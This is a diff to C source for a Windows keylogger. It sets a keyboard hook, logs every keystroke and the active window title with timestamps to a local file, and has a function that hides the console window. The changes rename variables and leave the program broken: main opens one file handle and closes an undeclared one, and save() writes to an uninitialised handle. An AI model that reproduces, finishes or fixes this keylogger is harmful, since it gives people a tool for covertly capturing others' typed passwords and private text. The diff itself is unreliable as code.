@@ -9,7 +9,7 @@
 #define hidden    //hiden/visable
 
 const char* keyname[] = {
-     [VK_BACK] = "[BACKSPACE]",
+    [VK_BACK] = "[BACKSPACE]",
     [VK_RETURN] = "\n",
     [VK_SPACE] = "_",
     [VK_TAB] = "[TAB]",
@@ -71,7 +71,7 @@ void ReleaseHook()
 }
 
 int save(int key_stroke) {
-    FILE* output_file;
+    FILE* e;
     char output[1024];
     static char lastwindow[256] = "";
     if ((key_stroke == 1) || (key_stroke == 2))
@@ -100,7 +100,7 @@ int save(int key_stroke) {
             char s[64];
             strftime(s, sizeof(s), "%FT%X%z", &tm_info);
             sprintf_s(output, "\n\n[Window: %s - at %s] ", window_title, s);
-            fputs(output, output_file);
+            fputs(output, e);
         }
     }
     if (keyname[key_stroke] != NULL)
@@ -118,13 +118,13 @@ int save(int key_stroke) {
         }
         sprintf_s(output, "%c", key);
     }
-    fputs(output, output_file);
-    fflush(output_file);
+    fputs(output, e);
+    fflush(e);
     printf("%s", output);
     return 0;
 }
 
-void Stealth() {
+void visibility() {
     #if defined visible
         ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
     #endif
@@ -135,11 +135,11 @@ void Stealth() {
 }
 
 int main() {
-    Stealth();
+    visibility();
     
     const char* keylog = "log";
     printf("Logging output to %s\n", keylog);
-    FILE* output_file = fopen(keylog, "a"); //please fix this it's not working :(
+    FILE* Outputtext = fopen(keylog, "a"); //please fix this it's not working :(
     
     SetHook();
     
@@ -148,6 +148,6 @@ int main() {
     {
     }
 
-    fclose(output_file);
+    fclose(e);
     return 0;
 }
